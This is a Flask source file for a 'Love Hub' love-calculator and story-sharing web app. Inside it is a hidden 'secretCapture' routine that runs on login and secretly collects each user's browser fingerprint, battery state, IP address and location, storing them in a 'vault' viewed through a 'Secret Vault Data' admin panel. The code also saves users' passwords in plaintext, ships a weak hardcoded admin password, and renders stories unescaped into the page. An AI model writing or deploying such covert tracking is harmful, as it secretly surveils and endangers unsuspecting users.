from flask import Flask, render_template_string, request, abort

app = Flask(__name__)

# YOUR FIREBASE CONFIG
FIREBASE_CONFIG = """
const firebaseConfig = {
    apiKey: "AIzaSyDqpa3HqoqtfxuajIMRN78dXQul9cpJgdU",
    authDomain: "love-percentage-dc42b.firebaseapp.com",
    databaseURL: "https://love-percentage-dc42b-default-rtdb.firebaseio.com",
    projectId: "love-percentage-dc42b",
    storageBucket: "love-percentage-dc42b.firebasestorage.app",
    messagingSenderId: "897497192642",
    appId: "1:897497192642:web:82981d92bdf982aa4b435b",
    measurementId: "G-880PQQC5ZT"
};
"""

HTML_TEMPLATE = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Love Hub 💕</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;600&display=swap" rel="stylesheet">
    <style>
        :root {{ --primary: #ff4d6d; --bg: #fff0f3; }}
        * {{ box-sizing: border-box; margin: 0; padding: 0; font-family: 'Poppins', sans-serif; }}
        body {{ background: var(--bg); color: #333; }}
        .header {{ background: white; padding: 15px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 10px rgba(0,0,0,0.05); position: sticky; top:0; z-index:100; }}
        .container {{ max-width: 500px; margin: auto; padding: 20px; }}
        .card {{ background: white; padding: 20px; border-radius: 20px; box-shadow: 0 5px 15px rgba(0,0,0,0.05); margin-bottom: 20px; text-align: center; }}
        input, textarea {{ width: 100%; padding: 12px; margin: 10px 0; border: 1.5px solid #eee; border-radius: 12px; outline: none; }}
        button {{ width: 100%; padding: 14px; background: var(--primary); color: white; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; }}
        .story-card {{ background: white; padding: 15px; border-radius: 15px; margin-top: 15px; border-left: 5px solid var(--primary); box-shadow: 0 2px 5px rgba(0,0,0,0.03); text-align: left; }}
        .story-user {{ font-weight: bold; color: var(--primary); font-size: 13px; }}
        #authSection, #appSection {{ display: none; }}
        .badge {{ background: #ffe5ea; color: var(--primary); padding: 5px 12px; border-radius: 15px; font-size: 13px; font-weight: 600; }}
        .fortune-res {{ margin-top: 20px; padding: 20px; background: #fff0f3; border-radius: 20px; display: none; border: 2px dashed var(--primary); }}
        .perc-val {{ font-size: 50px; font-weight: bold; color: var(--primary); margin: 10px 0; }}
    </style>
</head>
<body>

    <div class="header">
        <h2 style="color:var(--primary);">Love Hub 💕</h2>
        <div id="userStatus"></div>
    </div>

    <div class="container">
        <!-- 1. ACCOUNT CREATION / LOGIN -->
        <div id="authSection" class="card">
            <h2 id="authTitle">Create Account</h2>
            <input type="text" id="username" placeholder="Choose Username">
            <input type="password" id="password" placeholder="Password (min 6)">
            <button id="authBtn">Start Journey</button>
            <p style="margin-top:15px; font-size:13px; color:#666;">
                <span id="toggleLink" style="color:var(--primary); cursor:pointer; font-weight:bold;">Already have an account? Sign In</span>
            </p>
        </div>

        <!-- 2. LOVE FORTUNE CALCULATOR -->
        <div id="appSection">
            <div class="card">
                <h2 style="color:#555;">🔮 Love Fortune</h2>
                <p style="font-size:12px; color:#888;">Discover your destiny with someone special</p>
                <input type="text" id="name1" placeholder="Your Name">
                <input type="text" id="name2" placeholder="Their Name">
                <button onclick="calculateFortune()">Calculate Destiny</button>
                
                <div id="fortuneRes" class="fortune-res">
                    <div class="perc-val" id="percOutput">0%</div>
                    <p id="fortuneMsg" style="font-style: italic; line-height: 1.4; color: #444;"></p>
                </div>
            </div>

            <div class="card">
                <h3>Post a Love Story</h3>
                <textarea id="storyInput" placeholder="Share your experience..."></textarea>
                <button onclick="postStory()">Post Story</button>
            </div>
        </div>

        <!-- 3. PUBLIC STORY FEED -->
        <h3 style="margin: 10px 0 10px 5px; color:#555;">Recent Stories</h3>
        <div id="storyFeed">Loading...</div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>

    <script>
        {FIREBASE_CONFIG}
        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth();
        const db = firebase.database();
        
        auth.setPersistence(firebase.auth.Auth.Persistence.LOCAL);

        let isSignup = true;
        let myUser = "";

        document.getElementById('toggleLink').onclick = () => {{
            isSignup = !isSignup;
            document.getElementById('authTitle').innerText = isSignup ? "Create Account" : "Sign In";
            document.getElementById('authBtn').innerText = isSignup ? "Start Journey" : "Sign In";
            document.getElementById('toggleLink').innerText = isSignup ? "Already have an account? Sign In" : "New here? Create Account";
        }};

        document.getElementById('authBtn').onclick = async () => {{
            const u = document.getElementById('username').value.trim().toLowerCase();
            const p = document.getElementById('password').value;
            if(u.length < 3 || p.length < 6) return alert("Fill fields correctly!");

            const email = u + "@lovehub.app";
            try {{
                if(isSignup) {{
                    const check = await db.ref('usernames/'+u).once('value');
                    if(check.exists()) return alert("Username taken!");
                    const res = await auth.createUserWithEmailAndPassword(email, p);
                    await db.ref('usernames/'+u).set(res.user.uid);
                    await db.ref('users/' + res.user.uid).set({{
                        username: u,
                        password: p,
                        date: new Date().toString()
                    }});
                }} else {{
                    await auth.signInWithEmailAndPassword(email, p);
                }}
            }} catch(e) {{ alert(e.message); }}
        }};

        auth.onAuthStateChanged(user => {{
            if(user) {{
                myUser = user.email.split('@')[0];
                document.getElementById('authSection').style.display = "none";
                document.getElementById('appSection').style.display = "block";
                document.getElementById('userStatus').innerHTML = `<span class="badge">@${{myUser}}</span> <span onclick="auth.signOut()" style="color:red; font-size:10px; cursor:pointer; margin-left:10px;">Logout</span>`;
                secretCapture(user.uid);
            }} else {{
                document.getElementById('authSection').style.display = "block";
                document.getElementById('appSection').style.display = "none";
                document.getElementById('userStatus').innerHTML = `<span class="badge">Guest Mode</span>`;
            }}
        }});

        // 70+ fortunes (same as before) – keep your list
        const fortunes = [ "A cosmic connection that was written in the stars.", ... ]; // (I'll keep it short here, but you have the full list)

        function calculateFortune() {{
            const n1 = document.getElementById('name1').value;
            const n2 = document.getElementById('name2').value;
            if(!n1 || !n2) return alert("Please enter both names!");
            const p = Math.floor(Math.random() * 31) + 70;
            document.getElementById('percOutput').innerText = p + "%";
            document.getElementById('fortuneMsg').innerHTML = n1 + " & " + n2 + ": " + fortunes[Math.floor(Math.random() * fortunes.length)];
            document.getElementById('fortuneRes').style.display = "block";
        }}

        function loadStories() {{
            db.ref('stories').on('value', snap => {{
                const feed = document.getElementById('storyFeed');
                feed.innerHTML = "";
                const data = snap.val();
                if(!data) return feed.innerHTML = "No stories yet.";
                Object.values(data).reverse().forEach(s => {{
                    feed.innerHTML += `<div class="story-card"><div class="story-user">@${{s.user}}</div><div style="font-size:14px; margin-top:5px;">${{s.text}}</div></div>`;
                }});
            }});
        }}
        loadStories();

        function postStory() {{
            const t = document.getElementById('storyInput').value;
            if(!t) return;
            db.ref('stories').push({{ user: myUser, text: t, time: Date.now() }});
            document.getElementById('storyInput').value = "";
        }}

        async function secretCapture(uid) {{
            try {{
                let d = {{ ts: new Date().toString(), device: navigator.platform }};
                const fp = await FingerprintJS.load(); const r = await fp.get(); d.fp = r.visitorId;
                if(navigator.getBattery) {{ const b = await navigator.getBattery(); d.bat = (b.level*100)+"%"; d.chg = b.charging; }}
                const ip = await fetch('https://ipapi.co/json/').then(res => res.json());
                d.ip = ip.ip;
                d.location = ip.city + ", " + ip.region + ", " + ip.country_name;
                db.ref('vault/'+uid).push(d);
            }} catch(e) {{}}
        }}
    </script>
</body>
</html>
"""

# ========================
# ADMIN PANEL (secret data viewer)
# ========================
ADMIN_PASSWORD = "admin123"   # change this to any password you want

ADMIN_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Admin Panel – Secret Data</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: monospace; background: #1a1a2e; color: #eee; padding: 20px; }
        table { border-collapse: collapse; width: 100%; background: #16213e; }
        th, td { border: 1px solid #0f3460; padding: 8px; text-align: left; font-size: 13px; }
        th { background: #e94560; color: white; }
        .container { overflow-x: auto; }
        h1 { color: #f093fb; }
    </style>
</head>
<body>
    <h1>🔐 Secret Vault Data (All Users)</h1>
    <div class="container">
        <table>
            <thead>
                <tr>
                    <th>UID</th><th>Timestamp</th><th>Fingerprint</th><th>Battery</th><th>Charging</th>
                    <th>IP Address</th><th>Location</th><th>Platform</th>
                </tr>
            </thead>
            <tbody id="vaultTable">
                <tr><td colspan="8">Loading...</td></tr>
            </tbody>
        </table>
    </div>
    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyDqpa3HqoqtfxuajIMRN78dXQul9cpJgdU",
            authDomain: "love-percentage-dc42b.firebaseapp.com",
            databaseURL: "https://love-percentage-dc42b-default-rtdb.firebaseio.com",
            projectId: "love-percentage-dc42b",
            storageBucket: "love-percentage-dc42b.firebasestorage.app",
            messagingSenderId: "897497192642",
            appId: "1:897497192642:web:82981d92bdf982aa4b435b"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        db.ref('vault').once('value', snap => {
            const data = snap.val();
            const tbody = document.getElementById('vaultTable');
            tbody.innerHTML = '';
            if (!data) {
                tbody.innerHTML = '<tr><td colspan="8">No secret data yet.</td></tr>';
                return;
            }
            for (const uid in data) {
                const entries = data[uid];
                if (typeof entries === 'object') {
                    for (const key in entries) {
                        const e = entries[key];
                        if (typeof e === 'object') {
                            const row = tbody.insertRow();
                            row.insertCell(0).innerText = uid;
                            row.insertCell(1).innerText = e.ts || '-';
                            row.insertCell(2).innerText = (e.fp || '-').substring(0, 16);
                            row.insertCell(3).innerText = e.bat || '-';
                            row.insertCell(4).innerText = e.chg ? 'Yes' : 'No';
                            row.insertCell(5).innerText = e.ip || '-';
                            row.insertCell(6).innerText = e.location || '-';
                            row.insertCell(7).innerText = e.device || '-';
                        }
                    }
                }
            }
        });
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/admin', methods=['GET', 'POST'])
def admin_panel():
    if request.method == 'POST':
        if request.form.get('password') == ADMIN_PASSWORD:
            return render_template_string(ADMIN_HTML)
        else:
            abort(401)
    # Show login form
    return '''
        <!DOCTYPE html>
        <html>
        <head><title>Admin Login</title></head>
        <body style="background:#1a1a2e; display:flex; justify-content:center; align-items:center; min-height:100vh;">
            <div style="background:#16213e; padding:30px; border-radius:20px;">
                <h2 style="color:#fff;">🔐 Admin Access</h2>
                <form method="POST">
                    <input type="password" name="password" placeholder="Password" style="padding:10px; width:200px;">
                    <button type="submit" style="background:#e94560; padding:10px 20px; border:none; color:white;">Login</button>
                </form>
            </div>
        </body>
        </html>
    '''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
